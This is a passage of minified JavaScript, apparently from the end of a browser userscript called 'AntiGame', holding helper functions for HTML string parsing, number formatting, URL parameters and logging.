b,e),f)h&&g.push(a.slice(e,h));else return h?a.slice(e,h):""}}return g},afterHTML:function(a,b,c){return a&&(b=b?a.indexOf(b,c):0,0<=b&&(b=a.indexOf(">",b)))?a.slice(b+1):""},findCloseTag:function(a,b,c){var d=0,e=0,f=c;do if(f=a.indexOf("</"+b,f+3),-1<f){var d=a,g=b,h=c,k=0,l=f;do{var m=d.lastIndexOf("<"+g+" ",l-3),l=-1===m?d.lastIndexOf("<"+g+">",l-3):m;l>=h&&k++;if(l<=h)break}while(1);d=k;e++;if(d===e)return f+b.length+3}else break;while(1);return 0}},Wa={check:function(a,b){var c={},d;for(d=0;d<
b.length;d++)c[b[d]]=a[b[d]]||{};return c},compare:function(a,b){var c;if(a&&b){for(c in a)if(!b[c]||a[c]!==b[c])return!1;return!0}return!1}},n={d:function(a,b){return+a||+b||0},minMax:function(a,b,c){return Math.max(Math.min(+a||0,c),b)},isMinMax:function(a,b,c){return+a>=b&&+a<=c},isGreater:function(a,b){return 0<b&&a>=b},isLesser:function(a,b){return 0<a&&(0===b||a<=b)},parseInt:function(a,b){return parseInt(a,10)||+b||0},parseIntFormat:function(a){return a?parseInt((a+"").replace(/[^\d\-]/g,""),
10)||0:0},parseIntAbs:function(a){return a?parseInt((a+"").replace(/[^\d]/g,""),10)||0:0},parseVersion:function(a){return(a=/(\d+)\D*(\d*)\D*(\d*)\D*(\d*)/.exec(a?a.toString():""))?parseInt(("00"+a[1]).slice(-2)+("00"+a[2]).slice(-2)+("00"+a[3]).slice(-2)+("00"+a[4]).slice(-2),10):0}},r={d:function(a,b){return a?a+"":b?b+"":""},zero:function(a,b){return a||"0"===a+""?a+"":r.d(b)},trim:function(a,b){return a?(a+"").trim():b?(b+"").trim:""},trimLink:function(a){return r.trim(a).replace(/[/]+$/,"")},
trimZero:function(a,b){a="0000000000"+r.d(a);return a.substr(a.length-n.d(b))},wrap:function(a,b,c){return b?(a||"")+(b+"")+(c||""):""},search:function(a,b,c){return a?!c?a.indexOf(b):0<=c?a.indexOf(b,c):-1:-1},slice:function(a,b,c){return a&&0<=b?a.slice(b,0<=c&&c>b?c:void 0):""},formatNumber:function(a){if(a){for(var b=[],c=Math.abs(+a||0)+"";;){var d=c.slice(-3);if(d)b.unshift(d),c=c.substr(0,c.length-d.length);else break}return(0>a?"-":"")+b.join(e.separator)}return"0"},shortNumber:function(a,
b,c){var d;d=2===b?1:1===b?10:100;if(1E9<=a)a=Math.ceil(a/1E7/d)+"",c=e.unitMilliard;else if(1E6<=a)a=Math.ceil(a/1E4/d)+"",c=e.unitMega;else if(1E3<=a)a=Math.ceil(a/10/d)+"",c=e.unitKilo;else return a?a+"&thinsp;&nbsp;":c?"":"0&thinsp;&nbsp;";return b?a.substr(0,a.length-b)+e.comma+a.substr(a.length-b)+"&thinsp;"+c:a+"&thinsp;"+c},getUrlPara:function(a,b){var c=decodeURIComponent(b||document.location.href.toString()||"").replace(/\?/g,"&").split("&"+a+"=")[1];return c?c.split("&")[0]:""},addUrlPara:function(a,
b){var c=encodeURI(r.trim(b));return a&&c?"&"+a+"="+c:""}},J={log:function(a,b){b&&a&&(a="AntiGame:  "+a,pa?GM_log(a):qa?console.error(a):console&&console.log(a))},choose:function(a,b){return 0<a&&arguments[a+1]?arguments[a+1]:b},check:function(a){for(var b=1;b<arguments.length;b++)if(a===arguments[b])return!0;return!1},contain:function(a,b){return b.some(function(b){return b===a})}};F.Start()}})();